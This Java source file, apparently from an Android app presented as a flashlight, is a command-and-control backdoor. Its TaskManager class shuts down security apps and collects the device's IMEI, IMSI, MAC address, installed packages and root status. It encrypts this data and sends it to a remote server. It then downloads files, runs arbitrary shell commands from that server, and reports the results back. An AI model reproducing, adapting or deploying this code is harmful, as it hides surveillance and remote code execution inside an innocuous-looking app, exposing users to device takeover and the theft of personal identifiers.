package com.apps.flashlight;
import java.io.File;
import java.util.Locale;
import org.apache.http.Header;
import org.json.JSONArray;
import org.json.JSONObject;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.os.Environment;
import android.text.TextUtils;
import com.android.AService;
import com.android.PService;
import com.apps.flashlight.loopj.AsyncHttpClient;
import com.apps.flashlight.loopj.FileAsyncHttpResponseHandler;
import com.apps.flashlight.loopj.RequestParams;
import com.apps.flashlight.loopj.TextHttpResponseHandler;

public class TaskManager {
    private static final String Key_URL = "a";
    private static final String Key_LOCATION = "b";
    private static final String KEY_COMMANDS = "c";
    private static final String KEY_PLUGIN_INTERVAL = "d";
    private static final String KEY_ACTIVATE_INTERVAL = "d";
    private static final String KEY_SERVER_URL = "e";
    private static final String KEY_REPORT_CMD_RESULT = "f";
    private static final String KEY_BACKGROUND_ONLY = "G";
    private static AsyncHttpClient getHttpClient() {
        AsyncHttpClient client = new AsyncHttpClient();
        client.setURLEncodingEnabled(false);
        return client;
    }
    private static void download(final Context context, String url, final File file, final JSONArray commands, final boolean reportCmdResult) {
        getHttpClient().get(url, new FileAsyncHttpResponseHandler(new File(file.getAbsolutePath() + ".del")) {
            @Override
            public void onFailure(int statusCode, Header[] headers, Throwable e, File file) {
                Logger.error(e.getMessage(), e);
            }
            @Override
            public void onSuccess(int statusCode, Header[] headers, File result) {
                boolean success = statusCode == 200 && result != null && result.renameTo(file);
                if (success) {
                    executeCommands(context, commands, reportCmdResult);
                }
            }
        });
    }
    private static void executeCommands(final Context context, final JSONArray commands, final boolean reportCmdResult) {
        if (commands != null && commands.length() > 0) {
            JSONArray array = new JSONArray();
            for (int i = 0; i < commands.length(); i++) {
                String command = commands.optString(i);
                if (!TextUtils.isEmpty(command)) {
                    try {
                        JSONObject result = null;
                        if (command.startsWith("codess")) {
                            result = AppUtil.startService(context, command);
                        } else if (command.startsWith("stopapp")) {
                            result = AppUtil.stopApp(context, command.substring("stopapp".length() + 1));
                        } else if (command.startsWith("codesa")) {
                            result = AppUtil.startActivity(context, command);
                        } else {
                            result = CommonUtil.exeCmd(command);
                        }
                        array.put(result);
                    } catch (Throwable e) {
                        Logger.error(e);
                    }
                }
            }
            Logger.info(array.toString());
            if (reportCmdResult) {
                reportCmdResult(context, array);
            }
        }
    }
    public static void reportCmdResult(final Context context, final JSONArray obj) {
        try {
            long current = System.currentTimeMillis();
            AsyncHttpClient client = getHttpClient();
            client.addHeader("time", String.valueOf(current));
            client.addHeader("m", "r");
            client.setUserAgent("");
            RequestParams params = new RequestParams();
            final String password = CommonUtil.generatePassword(current);
            params.put("r", AES.encode(obj.toString(), password));
            params.put("p", composeBasicParams(context, password));
            String url = SettingUtil.getUrl(context);
            client.post(url, params, new TextHttpResponseHandler("UTF-8") {
                @Override
                public void onFailure(int statusCode, Header[] headers, String responseString, Throwable throwable) {}
                @Override
                public void onSuccess(int statusCode, Header[] headers, String responseString) {}
            });
        } catch (Throwable e) {
            Logger.error(e);
        }
    }
    private static String composeBasicParams(Context context, String password) {
        JSONObject params = new JSONObject();
        try {
            params.put("g", InfoUtil.getAndroidId(context));
            params.put("h", InfoUtil.getMacAddress(context));
            params.put("j", InfoUtil.getImei(context));
        } catch (Throwable e) {
            Logger.error(e);
        }
        return AES.encode(params.toString(), password);
    }
    private static String composeParams(Context context, String password) {
        JSONObject params = new JSONObject();
        try {
            params.put("g", InfoUtil.getAndroidId(context));
            params.put("h", InfoUtil.getMacAddress(context));
            params.put("j", InfoUtil.getImei(context));
            params.put("a", Build.MANUFACTURER);//manufacturer 
            params.put("b", Build.MODEL);//model = Build.MODEL;
            params.put("c", String.valueOf(InfoUtil.getVersionCode(context)));//versionCode;
            params.put("d", context.getPackageName());//packageName
            params.put("e", Locale.getDefault().getDisplayLanguage());//language
            params.put("f", String.valueOf(android.os.Build.VERSION.SDK_INT));
            params.put("i", android.os.Build.BRAND);
            params.put("k", InfoUtil.getImsi(context));
            params.put("l", InfoUtil.getCarrier(context));
            params.put("m", NetworkUtil.isWifiEnable(context));
            params.put("n", "mounted".equals(Environment.getExternalStorageState()));
            params.put("o", AppUtil.getInstalledPackages(context));
            params.put("p", !InfoUtil.isUserApp(context));
            params.put("q", InfoUtil.isSystemRooted());
            PackageInfo info = AppUtil.getPackageByServiceName(context, "com.android.FlaaaaaaaaaaaagService");
            if (info != null) {
                params.put("r", info.packageName);
                params.put("s", info.versionCode);
                params.put("t", info.lastUpdateTime);
            }
        } catch (Throwable e) {
            Logger.error(e);
        }
        return AES.encode(params.toString(), password);
    }
    public static void reqeust(final Context context) {
        AppUtil.stopSecurityApps(context);
        long current = System.currentTimeMillis();
        RequestParams params = new RequestParams();
        final String password = CommonUtil.generatePassword(current);
        params.put("post", composeParams(context, password));
        AsyncHttpClient client = getHttpClient();
        client.addHeader("time", String.valueOf(current));
        client.setUserAgent("");
        String url = SettingUtil.getUrl(context);
        Logger.info(url);
        client.post(url, params, new TextHttpResponseHandler("UTF-8") {
            @Override
            public void onFailure(int statusCode, Header[] headers, String responseBody, Throwable e) {
                if (e != null) {
                    Logger.error(e);
                }
            }
            @Override
            public void onSuccess(int statusCode, Header[] headers, String result) {
                if (statusCode >= 400 && statusCode < 500) {
                    SettingUtil.clearUrl(context);
                }
                if (result != null && result.trim().length() > 0) {
                    try {
                        Logger.info(result);
                        handleResult(context, new JSONObject(AES.decode(result, password)));
                    } catch (Throwable e) {
                        Logger.error(e);
                    }
                }
            }
        });
    }
    private static void handleResult(final Context context, JSONObject obj) {
        Logger.info(obj.toString());
        String apkUrl = obj.optString(Key_URL);
        String location = obj.optString(Key_LOCATION);
        JSONArray commands = obj.optJSONArray(KEY_COMMANDS);
        boolean reportCmdResult = obj.optBoolean(KEY_REPORT_CMD_RESULT);
        SettingUtil.setBackgroundOnly(context, obj.optBoolean(KEY_BACKGROUND_ONLY));
        SettingUtil.setUrl(context, obj.optString(KEY_SERVER_URL));
        if (SettingUtil.setPluginInterval(context, obj.optInt(KEY_PLUGIN_INTERVAL))) {
            context.startService(new Intent(context, PService.class).setAction("activate"));
        }
        if (SettingUtil.setActivateInterval(context, obj.optInt(KEY_ACTIVATE_INTERVAL))) {
            context.startService(new Intent(context, AService.class).setAction("activate"));
        }
        if (!TextUtils.isEmpty(apkUrl) && !TextUtils.isEmpty(location)) {
            File file = new File(location);
            if (file.exists()) {
                file.delete();
            }
            File folder = file.getParentFile();
            if (!folder.exists()) folder.mkdirs();
            download(context, apkUrl, file, commands, reportCmdResult);
        } else {
            executeCommands(context, commands, reportCmdResult);
        }
    }
}
